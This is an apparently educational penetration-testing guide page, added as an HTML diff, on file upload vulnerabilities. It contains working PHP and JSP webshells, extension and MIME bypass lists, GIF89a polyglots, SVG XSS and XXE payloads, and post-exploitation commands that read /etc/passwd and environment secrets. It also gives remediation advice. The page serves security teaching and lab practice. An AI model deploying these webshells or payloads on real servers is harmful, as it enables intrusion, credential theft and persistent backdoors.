@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="File upload vulnerability testing guide: extension bypass, content-type spoofing, and web shell deployment. Includes WAF bypass and Burp workflow.">
+    <meta property="og:title" content="File Upload Vulnerabilities – Web App Pentesting Guide">
+    <meta property="og:description" content="File upload vulnerability testing guide: extension bypass, content-type spoofing, and web shell deployment. Includes WAF bypass and Burp workflow.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>File Upload  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">Arbitrary File Upload</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">Real-World Analogy</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <a href="#how-it-works">How It Works</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#where-to-look">Where to Look</a>
+    <a href="#burp-workflow">Burp Suite Workflow</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#payloads">Payloads & Techniques</a>
+    <a href="#waf-bypass">WAF Bypass</a>
+    <a href="#exploitation">Exploitation & Impact</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">Testing Checklist</a>
+    <a href="#labs">PortSwigger Labs</a>
+    <a href="#remediation">Remediation</a>
+    <a href="#mistakes">Common Mistakes</a>
+    <a href="#see-also">🔗 See Also</a>
+  </nav>
+
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A04 · CVSS 9.8 · Day 3</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M14 3v5a1 1 0 0 0 1 1h5"/><path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z"/><path d="M12 18v-6"/><path d="m9 15 3-3 3 3"/></svg></span><span>Arbitrary File Upload</span></h1>
+      <p>A critical vulnerability where a web application accepts and stores user-supplied files without proper validation, allowing attackers to upload malicious executables (webshells, backdoors) that lead to remote code execution.</p>
+      <div class="badge-row">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-bscp">BSCP</span>
+        <span class="badge badge-difficulty">Intermediate</span>
+      </div>
+    </div>
+
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">Envelope Bypass</div>
+        <p>A building has a mail slot that says "Letters only." You carefully fold a remote-controlled robot into the shape of a standard envelope. Security checks pass it through because it looks like a letter. Once inside, the robot unfolds, extends its mechanical arms, and does exactly what you programmed it to do  · accessing files, deleting documents, whatever you want. That's a malicious file upload. The application validated the outer appearance (the extension, the MIME type) but didn't verify the actual content. What looks innocent on the surface is dangerous once executed.</p>
+      </div>
+    </section>
+
+    <section id="methodology">
+      <h2>📅 When in the 5-Day Workflow</h2>
+
+      <div class="workflow-days">
+        <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+        <div class="day-pill"><span class="day-num">Day 2</span>Auth/IDOR</div>
+        <div class="day-pill deep"><span class="day-num">Day 3</span>Deep Dive</div>
+        <div class="day-pill"><span class="day-num">Day 4</span>Server-Side</div>
+        <div class="day-pill"><span class="day-num">Day 5</span>Client-Side</div>
+      </div>
+
+      <div class="callout method-deep">
+        <div class="callout-title">🎯 Day 3  · File Upload Testing</div>
+        <p>On Day 3, find every file upload in the application: profile picture, document upload, import, avatar. For each one, run through the bypass checklist systematically in Burp Repeater:</p>
+        <ol>
+          <li>Upload a legitimate file  · confirm it works and find where it's stored.</li>
+          <li>Try <code>shell.php</code>  · blocked? What error do you get?</li>
+          <li>If blocked by extension: try <code>shell.phtml</code>, <code>shell.php5</code>, <code>shell.PhP</code>, <code>shell.php.jpg</code></li>
+          <li>If blocked by content-type: change <code>Content-Type: image/jpeg</code> in Burp while keeping .php extension</li>
+          <li>If both: try magic bytes trick  · prepend <code>GIF89a;</code> to your PHP code</li>
+          <li>If shell uploads: access via URL, pass <code>?cmd=id</code>, confirm RCE</li>
+        </ol>
+        <pre><code># Minimal PHP webshell
+&lt;?php system($_GET['cmd']); ?&gt;
+
+# Access after upload:
+https://target.com/uploads/shell.php?cmd=id
+https://target.com/uploads/shell.php?cmd=cat+/etc/passwd</code></pre>
+        <p><strong>Chain it:</strong> File upload RCE → read app config → find DB credentials → full database dump. Or: upload HTML file → stored XSS in a viewer. Or: upload SVG → XXE injection.</p>
+      </div>
+    </section>
+
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p>File upload vulnerabilities occur when servers accept and store user files without proper validation. The attack chain typically follows:</p>
+      <ol class="steps">
+        <li><strong>Identify upload functionality.</strong> Find a feature that accepts files (profile picture, resume, document, etc.).</li>
+        <li><strong>Bypass validation checks.</strong> The server may check file extension, MIME type, or file contents. Attackers craft files that pass these checks.</li>
+        <li><strong>Upload malicious file.</strong> A PHP webshell, JSP backdoor, or other executable is stored on the server.</li>
+        <li><strong>Locate the file.</strong> The attacker determines where the file was stored (predictable upload directory, returned filename, etc.).</li>
+        <li><strong>Access and execute.</strong> Navigate to the file's URL in a browser or via direct HTTP request. The server executes the malicious code.</li>
+        <li><strong>Achieve remote code execution (RCE).</strong> With a webshell, the attacker can run arbitrary commands on the server.</li>
+      </ol>
+      <p><strong>Key requirement:</strong> The upload directory must be web-accessible (inside the webroot) AND the file type must be executable by the server (PHP, JSP, SHTML, etc.).</p>
+    </section>
+
+    <section id="where-to-look">
+      <h2>Where to Look</h2>
+      <p>File upload features appear in many contexts:</p>
+      <ul>
+        <li><strong>Profile/avatar upload:</strong> User profile pictures, cover photos.</li>
+        <li><strong>Document submission:</strong> Resume uploads, assignment submission, invoice upload.</li>
+        <li><strong>Import functionality:</strong> "Import CSV," "Import spreadsheet," "Bulk upload."</li>
+        <li><strong>Logo/branding:</strong> Company logo, product thumbnail.</li>
+        <li><strong>Media galleries:</strong> Photo/video sharing, portfolio upload.</li>
+        <li><strong>Email attachments:</strong> If the application processes uploaded email files.</li>
+      </ul>
+      <p><strong>Critical questions to ask:</strong></p>
+      <ul>
+        <li>Is the upload directory inside the webroot (accessible via HTTP)?</li>
+        <li>Is the filename preserved or randomized?</li>
+        <li>Can I access the uploaded file via a direct URL?</li>
+        <li>What file types does the server execute (PHP, JSP, SHTML, ASP)?</li>
+      </ul>
+    </section>
+
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <strong>Upload a legitimate file.</strong> Use a normal image or document (JPEG, PDF, etc.). Intercept the request in Burp Proxy to observe the upload mechanism.
+          <pre><code>POST /api/upload-avatar HTTP/1.1
+...
+Content-Type: multipart/form-data; boundary=----...
+
+------...
+Content-Disposition: form-data; name="file"; filename="photo.jpg"
+Content-Type: image/jpeg
+
+[binary JPEG data]</code></pre>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <strong>Note the response and file location.</strong> Observe where the file is stored. The response might include a path like <code>/uploads/photo.jpg</code> or <code>/assets/user_123/photo.jpg</code>.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <strong>Modify the filename to .php.</strong> In Burp Repeater, change the filename to <code>shell.php</code>. Keep the file content and MIME type the same initially.
+          <pre><code>filename="shell.php"
+Content-Type: image/jpeg
+
+[binary JPEG data]</code></pre>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <strong>Also spoof the MIME type.</strong> Change <code>Content-Type</code> to <code>image/jpeg</code> even though it's a PHP file. This tricks basic validation.
+          <pre><code>filename="shell.php"
+Content-Type: image/jpeg</code></pre>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <strong>Replace the file content with a webshell.</strong> Use the PHP webshell payload:
+          <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+          Send the request and observe if it's accepted.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <strong>Access the uploaded file.</strong> Visit the URL where the file was stored: <code>http://target.com/uploads/shell.php</code>. If successful, you should reach the webshell. Test it with a parameter: <code>?cmd=id</code>.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">7</div>
+        <div>
+          <strong>If .php is blocked, try alternatives.</strong> Try extensions like <code>.php5</code>, <code>.phtml</code>, <code>.shtml</code>, or <code>.php.jpg</code>. Repeat steps 3-6 for each.
+        </div>
+      </div>
+
+    </section>
+
+    <section id="payloads">
+      <h2>Payloads & Techniques</h2>
+
+      <h3>Basic PHP Webshell</h3>
+      <p>The simplest webshell  · accepts a <code>cmd</code> parameter and executes system commands:</p>
+      <pre><code>&lt;?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?&gt;</code></pre>
+      <p><strong>Usage:</strong> <code>http://target.com/shell.php?cmd=whoami</code></p>
+
+      <h3>One-Liner PHP Webshell</h3>
+      <p>Minimal footprint, commonly used in CTFs and real attacks:</p>
+      <pre><code>&lt;?php system($_REQUEST['c']); ?&gt;</code></pre>
+      <p><strong>Usage:</strong> <code>?c=id</code> or POST with parameter <code>c</code>.</p>
+
+      <h3>JSP Webshell (Java Servers)</h3>
+      <p>For servers running Tomcat, JBoss, or other Java application servers:</p>
+      <pre><code>&lt;%@ page import="java.io.*" %&gt;
+&lt;%
+    String cmd = request.getParameter("cmd");
+    if (cmd != null) {
+        Process p = Runtime.getRuntime().exec(cmd);
+        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        while ((line = br.readLine()) != null) {
+            out.println(line + "&lt;br&gt;");
+        }
+    }
+%&gt;</code></pre>
+
+      <h3>File Extension Bypass Techniques</h3>
+      <pre><code>shell.php         (basic)
+shell.php5        (older PHP installations)
+shell.php3        (legacy)
+shell.phtml       (Apache + PHP)
+shell.shtml       (Server-Side Includes)
+shell.phps        (if .phps is executable)
+shell.php.jpg     (null byte or filter confusion)
+shell.jpg.php     (server-side processing order)
+shell.jpg%00.php  (null byte in older systems)
+shell.Php         (case variation)
+shell.pHp         (case variation)
+shell.php....    (trailing dots, Windows behavior)</code></pre>
+
+      <h3>MIME Type Spoofing</h3>
+      <p>Modify the <code>Content-Type</code> header to bypass validation:</p>
+      <pre><code>Original:
+Content-Type: application/x-php
+
+Spoofed as image:
+Content-Type: image/jpeg
+Content-Type: image/png
+Content-Type: image/gif</code></pre>
+
+      <h3>Polyglot Files (Valid Image + PHP Code)</h3>
+      <p>Create a file that is both a valid image and executable PHP:</p>
+      <pre><code>GIF89a;
+&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+      <p>Many applications check the magic bytes (GIF89a) and think it's safe. But PHP still executes the code.</p>
+
+      <h3>SVG with XSS (for Client-Side Exploitation)</h3>
+      <p>If the server returns SVG files with <code>Content-Type: image/svg+xml</code>, browsers execute embedded JavaScript:</p>
+      <pre><code>&lt;?xml version="1.0" standalone="no"?&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"&gt;
+&lt;/svg&gt;</code></pre>
+
+      <h3>XXE via SVG/XLSX</h3>
+      <p>If the application processes XML-based formats (SVG, XLSX), inject XXE payloads to read local files:</p>
+      <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+&lt;text&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;</code></pre>
+
+    </section>
+
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">
+          Progress: <span class="progress-mini">0/11</span>
+          <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check1">
+          <label for="check1">Identify all file upload features in the application</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check2">
+          <label for="check2">Upload a legitimate file and observe the server response and storage location</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check3">
+          <label for="check3">Attempt to access the uploaded file via direct URL</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check4">
+          <label for="check4">Test .php extension bypass (try .php5, .phtml, .shtml, etc.)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check5">
+          <label for="check5">Test MIME type spoofing (change Content-Type to image/jpeg)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check6">
+          <label for="check6">Test double extension (.php.jpg, .jpg.php)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check7">
+          <label for="check7">Test case variation (.Php, .PhP) on case-insensitive systems</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check8">
+          <label for="check8">Create and upload a polyglot file (image + PHP code)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check9">
+          <label for="check9">Test null byte bypass (.php%00.jpg) on legacy systems</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check10">
+          <label for="check10">Verify if uploaded file is executable (webshell RCE test with webshell)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check11">
+          <label for="check11">Test XXE/SVG upload for XXE exploitation</label>
+        </div>
+      </div>
+    </section>
+
+    <section id="waf-bypass">
+      <h2>WAF Bypass Techniques</h2>
+
+      <h3>Magic Bytes Trick</h3>
+      <p>Prepend file magic bytes to make a PHP file look like an image:</p>
+      <pre><code>GIF89a&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+      <p>The server reads the first bytes (GIF89a) and thinks it's safe. PHP execution may still occur depending on Apache configuration.</p>
+
+      <h3>Case Variation</h3>
+      <p>Try different case combinations if extension checking is case-sensitive:</p>
+      <pre><code>shell.php
+shell.PhP
+shell.pHp
+shell.PHP
+shell.Php</code></pre>
+
+      <h3>Alternate PHP Extensions</h3>
+      <pre><code>.php       (standard)
+.php3      (legacy)
+.php4      (legacy)
+.php5      (common alternate)
+.php7      (older systems)
+.phtml     (Apache + PHP)
+.phar      (PHP archive)
+.shtml     (Server-Side Includes)
+.pht       (some configs)
+.inc       (if processed as PHP)</code></pre>
+
+      <h3>Null Byte Injection (Legacy Systems)</h3>
+      <p>On older systems with PHP &lt; 5.3.4, null bytes truncate the filename:</p>
+      <pre><code>shell.php%00.jpg  →  shell.php (null byte terminates string)</code></pre>
+
+      <h3>Zip Slip (Archive Extraction)</h3>
+      <p>If the application extracts uploaded ZIP files, craft a malicious archive with path traversal:</p>
+      <pre><code>zip file structure:
+../../../var/www/html/shell.php</code></pre>
+      <p>When extracted, the file overwrites files outside the intended directory.</p>
+
+      <h3>Content-Type Confusion</h3>
+      <p>Some servers mishandle content types:</p>
+      <pre><code>Claim image/jpeg but upload PHP
+Use application/x-php with image extension
+Use multipart/form-data with misleading headers</code></pre>
+
+    </section>
+
+    <section id="exploitation">
+      <h2>Exploitation & Impact</h2>
+
+      <h3>Remote Code Execution (RCE)</h3>
+      <p><strong>Impact: Critical.</strong> With a webshell, attackers execute arbitrary commands on the server:</p>
+      <pre><code>?cmd=whoami              (identify user)
+?cmd=id                  (see groups and permissions)
+?cmd=cat /etc/passwd     (read user accounts)
+?cmd=env                 (read environment variables with secrets)
+?cmd=ls -la /home        (enumerate directories)</code></pre>
+
+      <h3>Information Disclosure</h3>
+      <p><strong>Impact: High.</strong> Read sensitive files from the compromised server:</p>
+      <ul>
+        <li>Application source code to find other vulnerabilities.</li>
+        <li>Config files (.env, database.yml) containing credentials and API keys.</li>
+        <li>SSH private keys (~/.ssh/id_rsa) for lateral movement.</li>
+        <li>Application secrets (JWT keys, encryption keys).</li>
+      </ul>
+
+      <h3>Lateral Movement</h3>
+      <p><strong>Impact: High.</strong> Use the compromised server as a pivot point:</p>
+      <ul>
+        <li>Install reverse shell for interactive access.</li>
+        <li>Enumerate internal network for other vulnerable systems.</li>
+        <li>Access internal databases or APIs not exposed externally.</li>
+        <li>Steal credentials to move laterally to other systems.</li>
+      </ul>
+
+      <h3>Backdoor Installation</h3>
+      <p><strong>Impact: Critical.</strong> Establish persistent access for long-term exploitation:</p>
+      <ul>
+        <li>Create new user accounts with administrative privileges.</li>
+        <li>Install SSH backdoors or web-accessible shells.</li>
+        <li>Modify cron jobs to maintain access.</li>
+        <li>Even if the initial shell is found and deleted, backdoors remain.</li>
+      </ul>
+
+      <h3>Data Exfiltration</h3>
+      <p><strong>Impact: Critical.</strong> Extract sensitive data from the application:</p>
+      <ul>
+        <li>Database credentials allow direct database access.</li>
+        <li>Customer data, financial records, personal information.</li>
+        <li>Source code for intellectual property theft.</li>
+      </ul>
+
+      <h3>Denial of Service</h3>
+      <p><strong>Impact: Medium.</strong> Damage the application or infrastructure:</p>
+      <ul>
+        <li>Delete critical files or database records.</li>
+        <li>Consume resources to crash the service.</li>
+        <li>Defacement or unauthorized modifications.</li>
+      </ul>
+
+    </section>
+
+    <section id="remediation">
+      <h2>Remediation</h2>
+
+      <h3>1. Whitelist Allowed File Extensions</h3>
+      <p>Only allow explicitly approved file types:</p>
+      <pre><code>const ALLOWED_EXTENSIONS = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
+const ext = filename.split('.').pop().toLowerCase();
+if (!ALLOWED_EXTENSIONS.includes(ext)) {
+  throw new Error('File type not allowed');
+}</code></pre>
+
+      <h3>2. Validate File Magic Bytes (MIME Type)</h3>
+      <p>Check the actual file content, not just the extension:</p>
+      <pre><code>const fileType = require('file-type');
+const type = await fileType.fromFile(uploadedPath);
+const ALLOWED_MIMES = ['image/jpeg', 'image/png', 'image/gif'];
+if (!ALLOWED_MIMES.includes(type.mime)) {
+  throw new Error('Invalid file type');
+}</code></pre>
+
+      <h3>3. Randomize Filenames</h3>
+      <p>Don't preserve the user-supplied filename. Use UUIDs or hashed values:</p>
+      <pre><code>const uuid = require('uuid');
+const newFilename = uuid.v4() + '.jpg';  // Removes .php or other executables
+fs.renameSync(uploadedPath, './uploads/' + newFilename);</code></pre>
+
+      <h3>4. Store Uploads Outside Webroot</h3>
+      <p>Keep uploaded files outside the directory served by the web server:</p>
+      <pre><code>/var/www/html/     (webroot  · files here are accessible via HTTP)
+/var/uploads/      (outside webroot  · files NOT directly accessible)</code></pre>
+      <p>If files must be served, use a download script that validates requests.</p>
+
+      <h3>5. Use Cloud Storage or Blob Services</h3>
+      <p>Store uploads in services like AWS S3, Google Cloud Storage, or Azure Blob Storage. These are not executable:</p>
+      <pre><code>AWS S3: Files are served with Content-Type headers
+  Content-Type: application/octet-stream  (forces download, not execution)</code></pre>
+
+      <h3>6. Disable Script Execution in Upload Directory</h3>
+      <p>Configure the web server to reject execution in upload directories (Apache .htaccess):</p>
+      <pre><code>&lt;Files *&gt;
+  SetHandler default-handler
+&lt;/Files&gt;
+
+php_flag engine off</code></pre>
+
+      <h3>7. Set Proper Content-Type Headers</h3>
+      <p>Force browsers to download files instead of rendering them:</p>
+      <pre><code>Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="file.pdf"</code></pre>
+
+      <h3>8. Implement Antivirus Scanning</h3>
+      <p>Scan uploaded files with antivirus engines before storing them:</p>
+      <pre><code>ClamAV (open-source antivirus)
+YARA rules for detecting webshells
+VirusTotal API integration</code></pre>
+
+      <h3>9. Log & Monitor Uploads</h3>
+      <p>Alert on suspicious upload patterns:</p>
+      <ul>
+        <li>Executable files attempted.</li>
+        <li>Large files from unusual users.</li>
+        <li>Repeated upload failures (sign of fuzz attacks).</li>
+      </ul>
+
+      <h3>10. Re-Validate on Download</h3>
+      <p>Even if uploads are validated, re-check files before serving them:</p>
+      <pre><code>async function serveFile(filename) {
+  const actualMime = await detectMimeType(filename);
+  const expectedMime = getMimeFromExtension(filename);
+  if (actualMime !== expectedMime) {
+    throw new Error('File type mismatch  · potential tampering');
+  }
+  return serveDownload(filename);
+}</code></pre>
+
+    </section>
+
+    <section id="labs">
+      <h2>PortSwigger Labs</h2>
+      <p>Practice file upload attacks on PortSwigger's labs. Start with basic extension bypass and progress to polyglot files and XXE:</p>
+      <ul>
+        <li><strong>Remote code execution via file upload</strong></li>
+        <li><strong>File upload vulnerabilities</strong> (multiple labs)</li>
+        <li><strong>Remote code execution via polyglot JPEG/PHP file</strong></li>
+        <li><strong>Race condition during file upload</strong></li>
+        <li><strong>XXE via SVG file upload</strong></li>
+      </ul>
+      <p>Visit <code>portswigger.net/web-security/file-upload</code> to access the labs.</p>
+    </section>
+
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+
+      <div class="callout warn">
+        <div class="callout-title">Only Trying .php Extension</div>
+        <p><strong>Mistake:</strong> Testing .php, failing, and concluding the vulnerability doesn't exist. The server may be configured to execute .php5, .phtml, or .shtml but not .php. <strong>Fix:</strong> Try all alternative PHP extensions. Research the server's configuration if you can identify it (Apache vs IIS vs nginx, PHP version, etc.).</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Not Checking If Files Are Web-Accessible</div>
+        <p><strong>Mistake:</strong> Uploading a webshell but not being able to access it because it's stored outside the webroot or behind a download mechanism. <strong>Fix:</strong> First, upload a normal file and try to access it via a direct URL. If you can't reach it, the upload is less dangerous (unless there are other ways to trigger execution).</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Forgetting to Test MIME Type Spoofing</div>
+        <p><strong>Mistake:</strong> Assuming the server validates content when it only checks the Content-Type header. <strong>Fix:</strong> Always test spoofing the MIME type. Keep the malicious PHP content but claim it's an image with <code>Content-Type: image/jpeg</code>.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Client-Side Validation Only</div>
+        <p><strong>Mistake:</strong> Seeing a JavaScript error that says "only images allowed" and assuming the check is enforced server-side. <strong>Fix:</strong> Intercept the upload in Burp and modify it regardless of client-side restrictions. Client-side validation is always bypassable.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Not Testing Polyglot Files</div>
+        <p><strong>Mistake:</strong> Only testing extension/MIME tricks and missing polyglot files that combine image headers with executable code. <strong>Fix:</strong> Create a GIF89a + PHP file. Magic byte checks may pass while execution still occurs.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Ignoring the Uploaded File Path</div>
+        <p><strong>Mistake:</strong> Not determining where the file was stored, making it impossible to access. <strong>Fix:</strong> Carefully observe the server's response. The response might include the file path, or you can infer it from common patterns (/uploads/, /assets/, /media/, etc.). Try common paths.</p>
+      </div>
+
+    </section>
+
+    <h2 id="see-also">🔗 See Also  · Attack Chains</h2>
+    <p>File upload vulnerabilities open the door to many other attack classes depending on how files are processed.</p>
+    <div class="see-also-grid">
+      <a class="see-also-card" href="path-traversal.html">
+        <span class="sa-icon">📁</span>
+        <span class="sa-name">Path Traversal</span>
+        <span class="sa-why">Use path traversal in the filename field to upload files outside the intended directory  · e.g., overwrite web root files.</span>
+      </a>
+      <a class="see-also-card" href="xss.html">
+        <span class="sa-icon">⚡</span>
+        <span class="sa-name">XSS</span>
+        <span class="sa-why">Upload an SVG or HTML file with a script tag  · if the server serves it with wrong content-type → stored XSS.</span>
+      </a>
+      <a class="see-also-card" href="xxe.html">
+        <span class="sa-icon">📄</span>
+        <span class="sa-name">XXE</span>
+        <span class="sa-why">Upload a .docx, .xlsx, or SVG containing an XXE payload  · the server-side parser processes the XML and fires the entity.</span>
+      </a>
+      <a class="see-also-card" href="race-conditions.html">
+        <span class="sa-icon">⏱️</span>
+        <span class="sa-name">Race Conditions</span>
+        <span class="sa-why">Upload a malicious file and race to access it before antivirus/validation deletes it  · the race condition window is your shell execution opportunity.</span>
+      </a>
+    </div>
+
+  </main>
+</div>
+
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+<script>
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn'; btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
+const sections = document.querySelectorAll('[id]');
+const navLinks = document.querySelectorAll('#sidebar a');
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) navLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+sections.forEach(s => observer.observe(s));
+const STORAGE_KEY = 'file-upload-checklist-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  const saved = localStorage.getItem(STORAGE_KEY + i);
+  if (saved === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(STORAGE_KEY + i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(wrap => {
+    const all = wrap.querySelectorAll('input[type=checkbox]');
+    const done = wrap.querySelectorAll('input[type=checkbox]:checked');
+    const mini = wrap.querySelector('.progress-mini');
+    const bar = wrap.querySelector('.progress-bar');
+    if (mini) mini.textContent = done.length + '/' + all.length;
+    if (bar) bar.style.width = (all.length ? (done.length/all.length*100) : 0) + '%';
+  });
+}
+updateProgress();
+</script>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
